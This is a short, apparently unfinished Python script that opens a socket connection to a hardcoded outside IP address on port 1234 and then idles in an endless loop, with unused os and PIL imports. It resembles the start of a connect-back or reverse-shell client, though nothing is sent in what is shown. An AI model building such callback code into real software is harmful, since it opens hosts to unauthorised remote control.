
import os
import socket
from PIL import Image
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connected = False
client.connect(("51.20.85.5", 1234))

while True:
    pass